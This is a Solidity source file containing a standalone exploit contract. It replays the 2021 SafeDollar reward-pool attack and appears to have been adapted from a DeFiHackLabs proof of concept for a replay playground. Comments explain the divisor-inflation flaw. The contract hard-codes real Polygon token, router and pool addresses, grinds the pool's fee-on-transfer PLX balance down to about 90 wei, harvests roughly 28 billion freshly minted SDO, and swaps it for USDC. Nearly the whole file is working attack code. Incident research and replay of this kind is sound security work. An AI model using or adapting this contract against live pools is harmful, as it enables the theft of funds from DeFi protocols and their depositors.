// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2021-06-SafeDollar).
//
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test
// contract `ContractTest` (the flash-swap callback `polydexCall` + the inner
// `depositToken` clone live in test/SafeDollar_exp.sol), so there is no
// standalone contract to deploy. This file is a faithful, self-contained copy
// of that inline attack so the playground can deploy it and record the harvest.
//
// Root cause: SdoRewardPool is a Sushi/MasterChef fork that normalises
// `accSdoPerShare` by `pool.lpToken.balanceOf(pool)` — a LIVE, attacker-shrinkable
// balance — instead of an internally tracked total-staked accumulator. The
// staked token for pid 9 is PLX, a fee-on-transfer token, and the pool also
// charges a deposit fee. Repeated deposit→withdraw therefore bleeds PLX out of
// the pool (the reward divisor) while the attacker's recorded `user.amount`
// barely moves. Grind the divisor to ~90 wei, let reward time accrue, then
// harvest: `accSdoPerShare += sdoReward * 1e18 / 90` explodes, and the reward
// is an unbounded SDO mint — ~28 billion SDO minted from nothing, dumped for
// ~188,156 USDC.
//
// Working-capital note: the on-chain attack sourced its PLX grind capital via
// two nested PolyDex flash swaps (see the writeup). The EVM Playground replays
// at a single block timestamp, so the flash-swap sourcing is replaced by a
// `dealToken` of PLX directly to this contract (Foundry `deal` equivalent) —
// the grind LOOP itself (deposit/withdraw until the pool's PLX balance is ~90
// wei) is copied verbatim and executes faithfully. The reward-accrual window
// the test opens with vm.warp() is reproduced by patching the pool's
// `lastRewardTime` storage back down before the recorded harvest (see config).

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
}

interface Uni_Router_V2 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] memory path,
        address to,
        uint256 deadline
    ) external;
}

interface SdoRewardPOOL {
    function deposit(uint256 _pid, uint256 _amount) external;
    function withdraw(uint256 _pid, uint256 _amount) external;
}

contract SafeDollarDrain {
    IERC20 constant SDO = IERC20(0x86BC05a6f65efdaDa08528Ec66603Aef175D967f);
    IERC20 constant PLX = IERC20(0x7A5dc8A09c831251026302C93A778748dd48b4DF);
    IERC20 constant USDC = IERC20(0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174);

    Uni_Router_V2 constant Router = Uni_Router_V2(0xe5C67Ba380FB2F70A47b489e94BCeD486bb8fB74);
    SdoRewardPOOL constant Pool = SdoRewardPOOL(0x17684f4d5385FAc79e75CeafC93f22D90066eD5C);

    // --- step 1 (unrecorded, run in setup): seed a stake + grind the divisor ---
    // PLX has been dealt to this contract by the setup. Approve the pool, deposit
    // a small seed (establishes a non-trivial recorded `user.amount`), then loop
    // deposit→withdraw pid 9 until the pool's PLX balance (the reward divisor) is
    // ~90 wei. The grind loop body is copied VERBATIM from the test's polydexCall
    // Pair2 branch. Because PLX is fee-on-transfer and the pool charges a deposit
    // fee, each round-trip permanently shrinks the pool's PLX balance while the
    // attacker's tracked `user.amount` barely moves.
    function grind() external {
        PLX.approve(address(Pool), type(uint256).max);

        // seed a stake (~216 PLX, matching the test's depositToken.depositPLX)
        uint256 seed = PLX.balanceOf(address(this)) / 10000;
        if (seed > 0) Pool.deposit(uint256(9), seed);

        // grind the pool's PLX balance (the reward divisor) down to ~90 wei
        while (PLX.balanceOf(address(Pool)) > 100) {
            uint256 amount = PLX.balanceOf(address(this));
            if (PLX.balanceOf(address(this)) * 5 / 1000 > PLX.balanceOf(address(Pool))) {
                amount = PLX.balanceOf(address(Pool)) * 1000 / 5;
            }
            Pool.deposit(uint256(9), amount);
            Pool.withdraw(uint256(9), amount);
        }
    }

    // --- step 2 (RECORDED): harvest the inflated reward + dump SDO ------------
    // After the grind the pool's PLX balance is ~90 wei (the divisor). The
    // recorder patched lastRewardTime back down so updatePool() now accrues the
    // reward window and divides by ~90 -> accSdoPerShare explodes -> _harvestReward
    // mints ~28 billion SDO here. Copied verbatim from depositToken.withdrawPLX +
    // sellSDO. The USDC stays in this contract (the playground scores it via
    // profitReceiver: "exploit").
    function attack() external {
        // withdraw(9, PLX.balanceOf(pool)) -> harvests the inflated SDO reward
        Pool.withdraw(uint256(9), PLX.balanceOf(address(Pool)));

        // dump the freshly-minted SDO into the SDO/USDC pair for ~188k USDC
        sellSDO();
    }

    function sellSDO() public {
        address[] memory path = new address[](2);
        path[0] = address(SDO);
        path[1] = address(USDC);
        USDC.approve(address(Router), type(uint256).max);
        SDO.approve(address(Router), type(uint256).max);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            20_000_000_000_000 * 1e18,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}
